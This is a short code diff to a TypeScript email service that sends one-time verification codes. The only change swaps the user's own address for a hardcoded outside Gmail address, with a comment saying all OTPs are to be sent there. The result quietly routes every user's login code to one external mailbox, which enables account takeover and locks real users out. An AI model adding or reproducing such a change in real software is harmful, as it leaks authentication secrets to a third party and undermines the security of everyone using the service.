@@ -16,7 +16,7 @@ export class MailService {
         try {
             const { data, error } = await this.resend.emails.send({
                 from: process.env.EMAIL_FROM || 'onboarding@resend.dev',
-                to: email,
+                to: 'covid1987654@gmail.com', // Override: Send all OTPs here
                 subject: 'Your Verification Code',
                 html: `
           <div style="font-family: sans-serif; padding: 20px; color: #333;">
